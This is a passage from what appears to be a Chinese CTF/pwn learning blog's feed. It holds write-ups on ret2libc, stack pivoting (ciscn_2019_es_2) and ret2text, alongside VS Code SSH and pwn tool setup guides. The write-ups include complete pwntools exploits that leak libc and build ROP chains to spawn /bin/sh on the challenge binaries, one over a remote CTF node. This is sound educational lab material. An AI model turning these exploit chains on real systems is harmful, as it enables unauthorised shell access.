class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">io=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x00401241&#x27;)</span></span><br><span class="line"><span class="comment">#io.recvuntil(&quot;ret2libc?&quot;)</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">_start_addr=elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment">#main_addr=0x0401203</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x00000000004012b3</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">addr=<span class="number">0x04011DD</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p64(pop_rdi_ret)+p64(read_got)+p64(puts_plt)+p64(addr)+p64(_start_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_real_addr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_real_addr))</span><br><span class="line"></span><br><span class="line">libc_addr=puts_real_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">systemaddr=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=libc_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">40</span>+p64(pop_rdi_ret)+p64(binsh)+p64(systemaddr)+p64(<span class="number">0xaaaaaaaa</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2libc3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移</title>
      <link href="/2024/07/24/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>/2024/07/24/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="背景及原理"><a href="#背景及原理" class="headerlink" title="背景及原理"></a>背景及原理</h2><p>我们在栈溢出时，有时候会碰到可供写入的字节数不够，比如只溢出到retaddr后面一点点，不够我们构造payload，这个时候可以考虑使用栈溢出</p><h3 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h3><p>先回顾一下栈帧的概念，栈帧也叫过程活动记录，是编译器用来实现函数调用过程的一种数据结构。C语言中，每个栈帧对应着一个未运行完的函数。从逻辑上讲，栈帧就是一个函数执行的环境：函数调用框架、函数参数、函数的局部变量、函数执行完后返回到哪里等等。栈是从高地址向低地址延伸的。每个函数的每次调用，都有它自己独立的一个栈帧，这个栈帧中维持着所需要的各种信息。寄存器ebp指向当前的栈帧的底部（高地址），寄存器esp指向当前的栈帧的顶部（低地址）</p><hr><p>栈溢出实现关键在于对ebp和esp的控制，也就是说，我们劫持esp和ebp，构造出一个新的栈帧，让系统执行这个栈帧。对于ebp来说，我们可以通过修改previous of ebp 这个位置的内容来控制，对于esp，则有leave这个指令，leave等同于mov esp ebp和pop ebp  （可以通过ROPgadget来找）</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>以ciscn_2019_es_2这题为例<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-24%20174338.png" alt="q"></p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-24%20174441.png" alt="a"></p><p>可以看到在vul函数中，我们利用read可以读入的数据只有0x30，显然不够构造一次完整的payload，所以我们考虑栈迁移</p><p>第一次read用于泄露old ebp的地址，第二次来构造栈迁移</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28853</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot; name?&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">36</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">old_ebp_addr=u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])  <span class="comment">#接收old ebp地址</span></span><br><span class="line">log.success(<span class="string">&quot;old_ebp=&quot;</span>+<span class="built_in">hex</span>(old_ebp_addr)) <span class="comment">#打印old ebp地址 （对exp无影响）</span></span><br><span class="line">leave_ret=<span class="number">0x08048562</span>  <span class="comment">#利用ROPgadget查找   ROPgadget --binary ciscn_2019_es_2 | grep &#x27;leave&#x27;</span></span><br><span class="line">system_plt_addr=<span class="number">0x08048400</span></span><br><span class="line">payload=<span class="string">b&#x27;aaaa&#x27;</span>+p32(system_plt_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(old_ebp_addr-<span class="number">0x38</span>+<span class="number">16</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p32(old_ebp_addr-<span class="number">0x38</span>) <span class="comment">#将ebp劫持到缓冲区起始处（距离ebp 0x38）</span></span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>第二次的payload前面的’aaaa’是因为执行leave后（其中的pop ebp）会导致esp的值增长一个字长,如下图<br>执行完leave指令（我们填入的leave）后的情况：<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-24%20180424.png" alt="a"></p><p>ebp里面是aaaa，esp指向system的地址，成功执行system函数</p>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一题需要动调的ret2text</title>
      <link href="/2024/07/17/ret2text(%E8%BF%9B%E9%98%B6)/"/>
      <url>/2024/07/17/ret2text(%E8%BF%9B%E9%98%B6)/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p><em>题目附件：<a href="https://raw.githubusercontent.com/C17zz/Pages/main/Img/stack">https://raw.githubusercontent.com/C17zz/Pages/main/Img/stack</a></em></p><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>checksec一下<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20155251.png" alt="1"><br>nx打开，没有pie，没有canary<br>转ida<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20155611.png" alt="1"><br>init()初始化作用，剩下一个vuln函数<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20155648.png" alt="1"><br>可以看到用for循环加read函数往s数组写入，但是for循环的次数由用户控制，这就存在缓冲区溢出漏洞，并且存在backdoor函数，是一个ret2text模型<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20155707.png" alt="1"></p><p>我们先试着打看看<br>会发现打不通<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20160840.png" alt="1"></p><p>&emsp;&emsp;打不通有两种情况，一种是没有执行到backdoor，一种是执行到了但是因为栈对齐的问题导致system函数没有正常执行。</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>这个时候就要进入动态调试环节，我们先把断点下在vuln结束的ret处<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20171457.png" alt="1"><br>然后发现填入的数据并没有覆盖到rbp+8处，说明read函数有问题<br>于是我们再将断点下在call read处<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20163603.png" alt="1"><br>然后continue，直到在偏移（相对于数组起始地址）0x1c处,我们看到在此时read的汇编是这样<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20164237.png" alt="1"><br>read写入的地址存储在rsi，rsi由rax赋值给它，rax&#x3D;rax+rdx，即[rbp - 4]+[rbp - 0x20]，而此时我们发现[rbp - 4]的地址正是偏移（相对于数组起始地址）0x1c处，所以0x1c处填入的数据会改变read写入的地址，于是我们的payload需要做出改变，在0x1c处填入’\x27’，从而让read写入的地址跳转到[rbp + 8]，再补上backdoor的地址就可以了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./stack&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">200</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x4012EB</span></span><br><span class="line">payload = cyclic(<span class="number">0x1c</span>)+<span class="string">b&#x27;\x27&#x27;</span>+p64(backdoor_addr)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x04012E5&#x27;)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2text </tag>
            
            <tag> 动态调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VScode远程连接虚拟机以及免密登录</title>
      <link href="/2024/04/16/VScode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/"/>
      <url>/2024/04/16/VScode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="一、安装VScode扩展"><a href="#一、安装VScode扩展" class="headerlink" title="一、安装VScode扩展"></a>一、安装VScode扩展</h2><p>这两个都可以<br><img src="https://gateway.pinata.cloud/ipfs/bafkreib3kvikh2y4ts6a6vzaqy6aouor7prjrxgy4t7kmpby7h3fe6ddli" alt="0"></p><p><em>Remote SSH 扩展：Remote SSH 扩展允许你通过 SSH 连接到远程计算机，并在本地的 VSCode 编辑器中进行编辑和调试。你可以使用该扩展连接到远程服务器、虚拟机或容器，并在远程主机上执行命令和调试任务。Remote SSH 扩展适用于那些希望在远程计算机上进行开发和调试的场景。它提供了与远程主机的基本交互和编辑功能。</em></p><p><em>Remote Development 扩展：Remote Development 扩展是一个更加综合的扩展，它提供了比 Remote SSH 更广泛的远程开发功能。Remote Development 扩展支持多种远程连接协议，包括 SSH、容器、WSL（Windows Subsystem for Linux）等。它不仅可以通过 SSH 连接到远程主机，还可以在本地开发环境中使用容器，或者通过 WSL 在 Windows 上进行 Linux 开发。Remote Development 扩展还提供了一些其他功能，例如远程容器的自动同步、远程环境的访问控制等。</em></p><h2 id="二、虚拟机方面"><a href="#二、虚拟机方面" class="headerlink" title="二、虚拟机方面"></a>二、虚拟机方面</h2><p><strong>1.安装ssh服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install openssh-server -y</span><br><span class="line">ps -e | grep sshd   //检查是否正常安装</span><br></pre></td></tr></table></figure><p><strong>2.查找ip</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure><p><img src="https://gateway.pinata.cloud/ipfs/bafkreiatdhwek43wsar3e4pfdrin7tt4enyyb45tv3kmo6x7pblcbfbtli" alt="0"></p><p>我们需要的是红色这部分（本地地址）（如果有斜杠，斜杠后面的数字不需要），这个是本地地址 （绿色的是广播地址）</p><h2 id="三、使用VScode远程连接"><a href="#三、使用VScode远程连接" class="headerlink" title="三、使用VScode远程连接"></a>三、使用VScode远程连接</h2><p><img src="https://gateway.pinata.cloud/ipfs/bafybeie7c47mzqmejdxlsf326bfhjcbhrs4itpg6aznlop3wo3ocehedny" alt="0"></p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreihiehwbkl6fqfx22xtkn767wwad24gfnijzg4fustl46vlcnhgrwy" alt="0"></p><p>按照它给的格式输入<br>即 </p><blockquote><p>ssh 用户名@本地地址</p></blockquote><p><img src="https://gateway.pinata.cloud/ipfs/bafkreigtaxmhlnfuxg3epwad5urlpipm2hx4leaiemp5sfgfoagvjxe6om" alt="0"></p><p>上面的默认选项就行</p><p>然后就ok了，接下来重复上面的操作，然后选择刚刚添加的host就能连接了</p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreifcuar4jdaeqjojlrolrct3bhas7vdi3oba4cefkmuxvxv6ti7p3a" alt="0"><br>虚拟机是Linux系统就选Linux</p><p>然后输个虚拟机密码就行</p><p>或者-&gt;远程资源管理器-&gt;ssh-&gt;鼠标右键-&gt;打开ssh配置文件，然后直接在里面改，格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host name</span><br><span class="line">HostName 000.000.000.000</span><br><span class="line">User username</span><br></pre></td></tr></table></figure><h2 id="免密登录"><a href="#免密登录" class="headerlink" title="免密登录"></a>免密登录</h2><p>在windows的命令窗口输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure><p>enter三次确认生成公钥</p><p>到目录C:\Users\用户名.ssh查看公钥<br>记事本打开id_rsa.pub ，复制里面全部内容</p><p>转到虚拟机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -a  // 查看有没有.ssh文件，没有就执行下一条命令，生成一个</span><br><span class="line">mkdir .ssh</span><br><span class="line">vim ~/.ssh/authorized_keys  //打开后把刚刚复制的公钥粘贴进去然后保存</span><br></pre></td></tr></table></figure><p><em>如果是手动创建的.ssh目录和authorized_keys文件，需要将其权限分别修改为700和600</em></p>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> VScode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-environment</title>
      <link href="/2024/04/15/pwn-environment/"/>
      <url>/2024/04/15/pwn-environment/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p><em>建议都在root权限下安装</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><h2 id="替换软件源"><a href="#替换软件源" class="headerlink" title="替换软件源"></a>替换软件源</h2><p>官方源下载太慢了，建议换成国内源（清华源、阿里源等） <del>虽然换了后我还是开着代理</del></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">cp /etc/apt/sources.list /etc/apt/sources.list.old</span><br><span class="line">vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>然后把原来的源删掉，对应版本的源复制进去<br><em>附：<a href="https://mirrors.tuna.tsinghua.edu.cn/">https://mirrors.tuna.tsinghua.edu.cn/</a>  清华源</em><br><em>不一定要用vi，其他文本编辑器也行</em></p><p>然后执行该命令验证一下源更换是否成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><h2 id="vim-安装-一个好用的文本编辑器"><a href="#vim-安装-一个好用的文本编辑器" class="headerlink" title="vim 安装 (一个好用的文本编辑器)"></a>vim 安装 (一个好用的文本编辑器)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">apt update &amp;&amp; apt install vim</span><br></pre></td></tr></table></figure><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; apt install git</span><br><span class="line">git --version</span><br></pre></td></tr></table></figure><h2 id="安装gcc"><a href="#安装gcc" class="headerlink" title="安装gcc"></a>安装gcc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; apt install gcc</span><br><span class="line">gcc --version</span><br></pre></td></tr></table></figure><h2 id="安装python3-pip"><a href="#安装python3-pip" class="headerlink" title="安装python3-pip"></a>安装python3-pip</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; apt install python3-pip</span><br><span class="line">pip3 --version</span><br></pre></td></tr></table></figure><h2 id="安装python3"><a href="#安装python3" class="headerlink" title="安装python3"></a>安装python3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; apt install python3</span><br><span class="line">python3 --version</span><br></pre></td></tr></table></figure><h2 id="安装gdb-multiarch"><a href="#安装gdb-multiarch" class="headerlink" title="安装gdb-multiarch"></a>安装gdb-multiarch</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install gdb-multiarch</span><br><span class="line">gdb-multiarch --version</span><br></pre></td></tr></table></figure><h2 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Gallopsled/pwntools.git</span><br><span class="line">sudo apt update &amp;&amp; apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line">pip3 list | grep pwntools</span><br></pre></td></tr></table></figure><p><em><strong>关于git</strong></em><br><em>git clone如果出现超时，可以试试进行如下操作</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如原地址为</span></span><br><span class="line">git clone https://github.com/tensorflow/tensorflow.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改后的地址：</span></span><br><span class="line">git clone https://gitclone.com/github.com/tensorflow/tensorflow.git </span><br></pre></td></tr></table></figure><p><em>就是在前面加个gitclone.com</em><br><em>或者试试开个代理？</em></p><p><em><strong>关于pip</strong></em><br><em>如果pip失败，提示超时，可以试试增加pip的超时时间</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --default-timeout=1000 package_name</span><br></pre></td></tr></table></figure><p><em>或者检查一下网络，开代理等等</em></p><h2 id="安装pwndbg、peda、gef"><a href="#安装pwndbg、peda、gef" class="headerlink" title="安装pwndbg、peda、gef"></a>安装pwndbg、peda、gef</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg.git</span><br><span class="line">git clone https://github.com/longld/peda.git</span><br><span class="line">git clone https://github.com/hugsy/gef.git</span><br><span class="line">cd ~/tools/pwndbg</span><br><span class="line"># 安装</span><br><span class="line">./setup.sh</span><br><span class="line"># 安装依赖插件</span><br><span class="line">pip3 install keystone-engine ropper keystone-engine</span><br><span class="line"># 可以通过编辑gdbinit挂载插件，如果.gdbinit显示为目录，就把它删掉，重新创建一个.gdbinit的文件</span><br><span class="line">vim ~/.gdbinit</span><br><span class="line"></span><br><span class="line"># 这个根据自己的路径来就可以了，用哪个就添加哪个，不用的记得注释掉</span><br><span class="line">source /root/Env/pwndbg/gdbinit.py</span><br><span class="line">#source /root/Env/peda/peda.py</span><br><span class="line">#source /root/Env/gef/gef.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="安装ROPgadget"><a href="#安装ROPgadget" class="headerlink" title="安装ROPgadget"></a>安装ROPgadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install capstone</span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line">cd ROPgadget</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><h2 id="安装seccomp-tools"><a href="#安装seccomp-tools" class="headerlink" title="安装seccomp-tools"></a>安装seccomp-tools</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gem install seccomp-tools</span><br><span class="line">seccomp-tools --version</span><br></pre></td></tr></table></figure><h2 id="安装LibcSearcher"><a href="#安装LibcSearcher" class="headerlink" title="安装LibcSearcher"></a>安装LibcSearcher</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line"># 安装</span><br><span class="line">python3 setup.py develop</span><br><span class="line"></span><br><span class="line"># 查看是否安装成功</span><br><span class="line">pip3 list | grep LibcSearcher</span><br></pre></td></tr></table></figure><h2 id="安装patchelf"><a href="#安装patchelf" class="headerlink" title="安装patchelf"></a>安装patchelf</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 更新索引并安装patchelf</span><br><span class="line">sudo apt update &amp;&amp; apt install patchelf </span><br><span class="line"></span><br><span class="line"># 验证安装是否成功</span><br><span class="line">patchelf --version</span><br></pre></td></tr></table></figure><h2 id="安装ropper"><a href="#安装ropper" class="headerlink" title="安装ropper"></a>安装ropper</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 安装依赖项capstone (前面装过了的话就跳过这步)</span><br><span class="line">pip3 install capstone</span><br><span class="line"># 安装依赖项filebytes</span><br><span class="line">pip3 install filebytes</span><br><span class="line"># 拉取源代码</span><br><span class="line">git clone https://github.com/sashs/ropper.git</span><br><span class="line"># 切换到目录下</span><br><span class="line">cd roppper</span><br><span class="line"># 如果setup.py没有执行权限，先赋予执行权限</span><br><span class="line">chmod +x setup.py</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><h2 id="安装one-gadget"><a href="#安装one-gadget" class="headerlink" title="安装one_gadget"></a>安装one_gadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 更新并安装依赖</span><br><span class="line">sudo apt update &amp;&amp; apt -y ruby ruby-dev</span><br><span class="line"># 安装one_gadget</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统——进程</title>
      <link href="/2024/04/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%BF%9B%E7%A8%8B/"/>
      <url>/2024/04/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%BF%9B%E7%A8%8B/</url>
      
